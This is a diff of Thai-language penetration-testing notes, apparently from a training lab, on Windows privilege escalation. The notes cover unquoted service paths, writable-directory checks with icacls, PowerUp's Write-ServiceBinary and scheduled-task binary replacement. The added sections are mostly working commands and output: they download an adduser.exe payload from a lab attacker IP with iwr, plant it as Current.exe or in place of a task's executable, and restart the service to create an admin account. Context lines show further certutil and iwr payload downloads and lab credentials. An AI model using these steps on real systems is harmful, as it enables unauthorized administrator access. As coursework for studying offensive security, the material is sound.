@@ -7,7 +7,7 @@ git clone https://github.com/gentilkiwi/mimikatz.git
 
 # Windows Privilege Escalation 
 
-```
+```powershell
 # Level 1 Win Priv Manual 
 
 whoami 
@@ -77,8 +77,8 @@ evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
 
 Level 2 Automate tools 
 
-```
-ติดตั้ง WinPeas
+```bash
+# ติดตั้ง WinPeas
 sudo apt install peass 
 updatedb 
 locate winpeas
@@ -111,7 +111,7 @@ certutil.exe -urlcache -split -f http://192.168.45.241/Seatbelt.exe Seatbelt.exe
 
 Level 3: Hack Windows Service 
 
-```
+```powershell
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 
 |Mask|Permissions|
@@ -248,4 +248,137 @@ iwr -uri http://192.168.45.241/dllhij.dll -OutFile 'C:\FileZilla\FileZilla FTP C
 สุดท้ายคือเปิด FileZilla ก็จะเห็น dave3 ด้วยคำสั่ง net user 
 
 [[Unquoted Service Paths]]
+
+```powershell
+# คำสั่งสำหรับตรวจสอบ Service ที่มีช่องโหว่ Unquoted Service Paths และไม่อยู่ใน Path C:\Windows 
+
+wmic service get name,pathname |  findstr /i /v "C:\Windows\\" 
+
+
+edgeupdatem                                "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
+---------------------------------------------------------------------
+# จากผลลัพธ์จะเห็นว่า Service ชื่อ GammaService นั้นมีช่องโหว่ Unquoted Service Path
+GammaService                               C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+---------------------------------------------------------------------
+
+# ทดสอบเปิดและปิด Service ดังกล่าว 
+Start-Service GammaService
+Stop-Service GammaService
+Restart-Service GammaService
+
+# จากช่องโหว่ทำให้เกิดผละกระทบที่น่าเป็นไปได้คือ 
+# C:\Program.exe
+# C:\Program Files\Enterprise.exe
+# C:\Program Files\Enterprise Apps\Current.exe
+# C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+
+
+```
+
+เราสามารถตรวจสอบสิทธิ์ของแต่ละ Path ที่เป็นช่องโหว่ได้ 
+```powershell
+PS C:\Users\steve> icacls "C:\"
+C:\ BUILTIN\Administrators:(OI)(CI)(F)
+    NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+    BUILTIN\Users:(OI)(CI)(RX)
+    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
+    NT AUTHORITY\Authenticated Users:(AD)
+    Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)
+    
+Successfully processed 1 files; Failed processing 0 files
+    
+PS C:\Users\steve>icacls "C:\Program Files"
+C:\Program Files NT SERVICE\TrustedInstaller:(F)
+                 NT SERVICE\TrustedInstaller:(CI)(IO)(F)
+                 NT AUTHORITY\SYSTEM:(M)
+                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
+                 BUILTIN\Administrators:(M)
+                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
+                 BUILTIN\Users:(RX)
+                 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
+                 CREATOR OWNER:(OI)(CI)(IO)(F)
+
+PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
+C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
+                                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+                                 BUILTIN\Administrators:(OI)(CI)(F)
+                                 BUILTIN\Users:(OI)(CI)(RX,W) ***************
+                                 CREATOR OWNER:(OI)(CI)(IO)(F)
+                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(RX)
+                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+```
+
+ให้ลองหา Permission ของ Path ที่มีสิทธิของ Users เป็น W ขึ้นไป จากตัวอย่างจะเห็นว่า Path C:\Program Files\Enterprise Apps\ นั้นมีช่องโหว่สามารถเขียนได้ 
+
+โดยเมื่อพบแล้วเราสามารถนำ Code ที่ไม่ปลอดภัยไปวางใน Path ดังกล่าว คือ 
+
+```powershell
+C:\Program Files\Enterprise Apps\. 
+```
+
+
+การโจมตีจะต้องตั้งชื่อ Payload เป็น Current.exe ซึ่งเป็นตัวต่อของ Path ของ Service ดังกล่าว
+
+```powershell
+iwr -uri http://192.168.45.168/adduser.exe -Outfile Current.exe
+# จากนั้นเปิดปิด Service ที่มีช่องโหว่อีกครั้ง
+Start-Service GammaService
+Stop-Service GammaService
+Restart-Service GammaService
+
+# จะพบว่ามี user deav2 ถูกเพิ่มขึ้นและมีสิทธิ์เป็น Admin
+
+```
+
+--- 
+อีกวิธีคือ การใช้งาน PowerUp.ps1 สำหรับ [[Unquoted Service Paths]] 
+
+```powershell
+
+powershell -ep bypass
+. .\PowerUp.ps1
+
+Get-UnquotedService
+# ตรวจสอบ icacls ในแต่ละ Path จนพบสิทธิที่สามารถดำเนินการเขียนทับได้ 
+PS C:\Users\damian\Desktop> icacls.exe  'C:\Enterprise Software\Monitoring Solution'
+C:\Enterprise Software\Monitoring Solution CLIENTWK221\damian:(OI)(CI)(RX,W)
+                                           BUILTIN\Administrators:(OI)(CI)(F)
+                                           NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+                                           BUILTIN\Users:(OI)(CI)(RX)
+
+# รันคำสั่ง Write-ServiceBinary 
+Write-ServiceBinary -Name 'ReynhSurveillance' -Path "C:\Enterprise Software\Monitoring Solution\Surveillance.exe"
+
+# จากนั้นใช้คำสั่ง Netuser จะเห็น john:Password123!
+net user 
+```
+
+[[## Scheduled Tasks]]
+
+```powershell
+# ตรวจสอบ Tasklist 
+schtasks /query /fo LIST /v 
+schtasks /query /fo LIST | findstr "TaskName"
+schtasks /query /fo LIST /v /tn "\Microsoft\Voice Activation"
+```
+![[Stask-1.png]]
+
+```powershell
+# ตรวจสอบสิทธิ์ของไฟล์ดังกล่าว
+icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
+
+# backup ไฟล์ BackendCacheCleanup.exe
+move .\BackendCacheCleanup.exe .\BackendCacheCleanup.exe.bak
+
+# upload payload สำหรับ adduser 
+iwr -Uri http://192.168.45.168/adduser.exe -Outfile BackendCacheCleanup.exe
+
+# ตรวจสอบโดยใช้คำสั่ง net user จะพบ dave2 
+net user 
+
+xfreerdp /v:192.168.160.220 /u:dave2 /p:'password123!' /cert-ignore /dynamic-resolution +clipboard /drive:TEST,/home/kali/    
+
+```
 
